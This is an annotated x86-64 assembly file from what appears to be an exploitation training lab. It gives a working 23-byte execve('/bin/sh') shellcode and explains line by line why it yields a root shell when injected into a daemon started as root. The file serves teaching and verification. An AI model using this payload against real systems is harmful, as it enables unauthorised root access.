; ============================================================================
; shellcode.S -- the reference shellcode for the wosuid lab (foowosc)
; ============================================================================
;
; This file exists for ONE reason: to let you prove that the `SHELLCODE[]`
; array in foowosc.c is exactly the machine code you would get from
; assembling these instructions. It is not used by the exploit, which carries
; the bytes inline so it has no runtime dependency on nasm.
;
;   make verify-shellcode   assembles this and diffs it against foowosc.c
;
; WHAT IT DOES
; ------------
;   execve("/bin/sh", argv = NULL, envp = NULL)
;
;   23 bytes that turn the process into a shell -- byte-identical to the
;   shellcode in the parent lab's fooc.c.
;
; WHY 23 BYTES AND NOT 32 -- the difference between the labs, in one payload
; ---------------------------------------------------------------------------
; The SUID lab (foosd/foosc) needed a 32-byte shellcode that prefixed
; setreuid(0,0). Why:
;
;   * a setuid-root binary gives the process euid 0 but LEAVES ruid = the
;     launching user (1000);
;   * bash (and dash) check `euid != ruid` at startup and, absent `-p`,
;     reset euid = ruid -- the shell's own guard against this attack;
;   * so a plain execve("/bin/sh") from a *setuid* process yields a shell
;     that has quietly dropped root; the real uid must be cleared first.
;
; THIS lab deliberately has NO setuid bit. The daemon is root because it was
; STARTED as root: real uid 0, effective uid 0, saved uid 0. fork() inherits
; all three, execve() changes none of them, and bash starts with equal uid 0s
; -- the guard has nothing to reset, so the plain execve keeps root. The
; same 23 bytes that pwnd the user-level `food` daemon in the parent lab
; open a ROOT shell here, because the process they run inside is already
; fully root.
;
; The setuid bit transfers privilege; it is not the privilege itself. When a
; root-started daemon is exploited, the outcome is identical to exploiting a
; setuid binary -- minus the need to fiddle with the real uid.
;
; Register usage follows the System V AMD64 ABI: first integer args in
; rdi, rsi, rdx; syscall number in rax.
; ============================================================================

                BITS 64

; section .text   -- mark it executable, the default, so `nasm -f bin` emits
;                    the instruction bytes with no ELF wrapper around them.
                section .text

; ---------------------------------------------------------------------------
;   xor    esi, esi
;   rsi = 0  ->  argv = NULL
;
;   Zeroing with xor instead of `mov esi, 0` is two bytes shorter (2 vs 5)
;   and the classic x86 idiom for producing a zero without a memory operand.
; ---------------------------------------------------------------------------
                xor    esi, esi

; ---------------------------------------------------------------------------
;   xor    edx, edx
;   rdx = 0  ->  envp = NULL
;
;   argv = NULL lets the kernel synthesise argv[0] from the pathname, and
;   envp = NULL gives the new program an empty environment. The shell runs
;   fine but with no PATH, so `id` and `uname` work and bare `vi` does not --
;   a small detail that surprises people, and the reason the relayed local
;   side of the exploit never relies on a PATH-based command.
; ---------------------------------------------------------------------------
                xor    edx, edx

; ---------------------------------------------------------------------------
;   movabs rdi, 0x68732f6e69622f
;   rdi = the 8 bytes 2f 62 69 6e 2f 73 68 00, i.e. "/bin/sh\0"
;
;   Read the immediate right-to-left as bytes and it spells the string out.
;   That packing is the whole trick: eight bytes of payload in a ten-byte
;   instruction, no data section, no relocation, no alignment padding.
; ---------------------------------------------------------------------------
                movabs rdi, 0x68732f6e69622f

; ---------------------------------------------------------------------------
;   push   rdi
;   Put those eight bytes on the stack, where a string has to live so that a
;   register can point at it. The stack is writable and lives at an
;   attacker-chosen address, so this is the position-independent way to
;   materialise a string constant inside a payload that has no .data.
; ---------------------------------------------------------------------------
                push   rdi

; ---------------------------------------------------------------------------
;   mov    rdi, rsp
;   rdi = the address of the string we just pushed = argv[0] as well as the
;   pathname. Reusing one buffer for both is legal; the kernel only reads the
;   pathname before it sets up the new stack, and by then argv[0] is copied.
; ---------------------------------------------------------------------------
                mov    rdi, rsp

; ---------------------------------------------------------------------------
;   push   0x3b
;   pop    rax
;   rax = 59 = the __NR_execve slot in the x86-64 syscall table.
;
;   Syscall numbers are part of the kernel ABI and are frozen: 0 = read,
;   1 = write, 2 = open, ..., 59 = execve. `push 0x3b; pop rax` is the
;   idiomatic 2-byte way to load a small constant; `mov eax, 0x3b` is 5.
; ---------------------------------------------------------------------------
                push   0x3b
                pop    rax

; ---------------------------------------------------------------------------
;   syscall
;   Trap into the kernel. On return, either we are a shell (success) or we
;   are handed a -errno in rax and fall off the end of the payload (failure).
; ---------------------------------------------------------------------------
                syscall

; Note what is NOT here:
;   * no setreuid -- the process was started as root, so ruid is already 0
;     (compare the 32-byte variant in the suid lab, which had to clear it).
;   * no `ret`    -- execve does not return.
;   * no `nop` sled -- we jump straight to the first byte.